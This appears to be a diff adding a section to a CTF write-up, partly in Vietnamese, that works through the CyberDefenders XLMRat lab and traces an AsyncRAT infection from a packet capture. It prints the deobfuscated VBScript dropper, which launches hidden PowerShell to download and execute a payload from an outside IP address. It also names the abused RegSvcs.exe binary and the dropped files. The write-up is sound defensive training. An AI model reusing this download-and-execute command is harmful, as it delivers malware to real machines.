@@ -2654,6 +2654,99 @@ Trong `/var/www/html/jabc/includes/bootstrap.inc`:
 
 **$\rightarrow$ Đáp án: `4444`**
 
+### VI. XLMRat Lab:
+> Analyze network traffic to identify malware delivery, deobfuscate scripts, and map attacker techniques using MITRE ATT&CK, focusing on stealthy execution and reflective code loading.
+- [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/)
+- Kịch bản: *"A compromised machine has been flagged due to suspicious network traffic. Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise."*
+
+#### 1. The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?
+Check for the `Conversations`:
+![image](https://hackmd.io/_uploads/rkbcviYdMx.png)
+Then filter the IP address `45.126.209.4`:
+![image](https://hackmd.io/_uploads/SyWawjY_Mx.png)
+Follow the HTTP Stream of the above packet:
+![image](https://hackmd.io/_uploads/HJefuiYOGx.png)
+There is a obfuscated script, it can be turned into the visible script below:
+``` vbscript
+Dim shell, psCommand
+psCommand = "[BYTe[]];$A123='IeX(NeW-OBJeCT NeT.W';$B456='eBCLIeNT).DOWNLO';[BYTe[]];$C789='VAN(''http://45.126.209.4:222/mdm.jpg'')'.RePLACe('VAN','ADSTRING');[BYTe[]];IeX($A123+$B456+$C789)"
+Set shell = CreateObject("WScript.Shell")
+shell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & psCommand, 0, True
+Set shell = Nothing
+```
+This script was used to download `mdm.jpg`.
+
+**$\rightarrow$ Đáp án: `http://45.126.209.4:222/mdm.jpg`**
+
+#### 2. Which hosting provider owns the associated IP address?
+Searching on Google:
+![image](https://hackmd.io/_uploads/HysqqsFOzl.png)
+
+**$\rightarrow$ Đáp án: `ReliableSite.Net`**
+
+#### 3. By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?
+Follow HTTP Stream of this packet:
+![image](https://hackmd.io/_uploads/Sk9mAsYuzl.png)
+![image](https://hackmd.io/_uploads/HyYV0jFdGg.png)
+There has a long malicious script. Copy the value of `$hexString_bbb` to CyberChef:
+![image](https://hackmd.io/_uploads/SyN-Mhtdfx.png)
+
+**$\rightarrow$ Đáp án: `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`**
+
+#### 4. What is the malware family label based on Alibaba?
+Paste the above hash into [VirusTotal](https://www.virustotal.com/gui/file/1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798):
+![image](https://hackmd.io/_uploads/ByI77hKOGx.png)
+**$\rightarrow$ Đáp án: `asyncrat`**
+
+#### 5. What is the PE header compile (Creation Time) timestamp of the malware?
+Paste the value of `$hexString_bbb` to the `hex_string` in the following script:
+``` py
+import pefile
+import datetime
+ 
+hex_string = ???
+clean_hex = hex_string.replace("_", "").replace(" ", "").replace("\n", "").replace("'", "")
+
+raw_bytes = bytes.fromhex(clean_hex)
+pe = pefile.PE(data=raw_bytes)
+timestamp = pe.FILE_HEADER.TimeDateStamp
+compile_time = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc)
+print(f"{compile_time} (UTC)")
+```
+Besides that, we can fine the timestamp in VirusTotal:
+![image](https://hackmd.io/_uploads/B101JptOGl.png)
+> We can turn `.bin` into `.exe` by copying the value of `$hexString_bbb` to a `.txt` file then using this following script and analyse the executable file by Detect It Easy.
+> ``` py
+> import sys
+> 
+> with open(r"C:\Users\Ha Nguyen\Desktop\XLMRat\mdm.txt", "r") as f:
+>     hex_string = f.read()
+> clean_hex = hex_string.replace("_", "").replace(" ", "").replace("\n", "").replace("'", "").replace('"', '')
+> file_bytes = bytes.fromhex(clean_hex)
+> output_path = r"C:\Users\Ha Nguyen\Desktop\XLMRat\payload.bin"
+> with open(output_path, "wb") as f:
+>     f.write(file_bytes)
+> print(output_path)
+> ```
+> ![image](https://hackmd.io/_uploads/r1J_lTK_Ml.png)
+> ![image](https://hackmd.io/_uploads/HyEFx6tOze.png)
+
+**$\rightarrow$ Đáp án: `2023-10-30 15:08`**
+
+#### 6. Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.
+In Wireshark:
+![image](https://hackmd.io/_uploads/rJVJmTKdGx.png)
+If we remove all the `#`, we will get `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`:
+![image](https://hackmd.io/_uploads/r1JwmpYuGl.png)
+
+**$\rightarrow$ Đáp án: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`**
+
+#### 7. The script is designed to drop several files. List the names of the files dropped by the script.
+There are three files named `Conted` that having three different extensions in `C:\Users\Public\`:
+![image](https://hackmd.io/_uploads/S1DKETtuzg.png)
+
+**$\rightarrow$ Đáp án: `Conted.ps1, Conted.bat, Conted.vbs`**
+
 ## E. Hack The Box:
 ### I. Packet Puzzle:
 - [Link bài lab](https://app.hackthebox.com/sherlocks/Packet%2520Puzzle?tab=play_sherlock)
